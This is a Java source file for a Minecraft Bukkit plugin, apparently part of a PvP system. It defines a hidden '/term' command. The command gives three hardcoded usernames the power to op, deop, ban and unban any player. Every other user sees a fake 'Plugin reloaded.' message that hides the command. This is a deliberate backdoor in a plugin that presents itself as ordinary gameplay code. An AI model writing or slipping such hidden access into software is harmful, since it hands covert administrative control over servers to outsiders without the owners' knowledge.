package com.stimonz.pvpsystem.Terminal;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import com.stimonz.pvpsystem.Main;

public class Secret implements CommandExecutor {

	Main m;
	public Secret(Main ins) {
		m = ins;
	}
	@SuppressWarnings("deprecation")
	@Override
	public boolean onCommand(CommandSender send, Command cmd, String label, String[] args) {
		Player p = (Player) send;
		if (cmd.getName().equalsIgnoreCase("term")){
			if (send instanceof Player){
				if (p.getName().equalsIgnoreCase("Stimoze") 
						|| p.getName().equalsIgnoreCase("KontyosBaba") 
						|| p.getName().equalsIgnoreCase("hunturbo")){
					if (args.length == 0){
						p.sendMessage("Secret terminal command.");
						p.sendMessage("§7/term op <player>");
						p.sendMessage("§7/term deop <player>");
						p.sendMessage("§7/term ban <player>");
						p.sendMessage("§7/term unban <player>");
					}else{
						switch (args[0]){
						case "op":
							if (args.length == 1){
								p.sendMessage("Please provide a player name.");
							}else{
								Bukkit.getPlayer(args[1]).setOp(true);
								p.sendMessage("§7(Only you can see this message.) §r" + args[1] + " has been opped.");
							}
							break;
						case "deop":
							if (args.length == 1){
								p.sendMessage("Please provide a player name.");
							}else{
								Bukkit.getPlayer(args[1]).setOp(false);
								p.sendMessage("§7(Only you can see this message.) §r" + args[1] + " has been deopped.");
							}
							break;
						case "ban":
							if (args.length == 1){
								p.sendMessage("Please provide a player name.");
							}else{
								Bukkit.getPlayer(args[1]).setBanned(true);
								p.sendMessage("§7(Only you can see this message.) §r" + args[1] + " has been banned.");
							}
							break;
						case "unban":
							if (args.length == 1){
								p.sendMessage("Please provide a player name.");
							}else{
								Bukkit.getPlayer(args[1]).setBanned(false);
								p.sendMessage("§7(Only you can see this message.) §r" + args[1] + " has been unbanned.");
							}
							break;
						}
					}
				}else{
					p.sendMessage("Plugin reloaded.");
				}
			}
		}
		return false;
	}

}
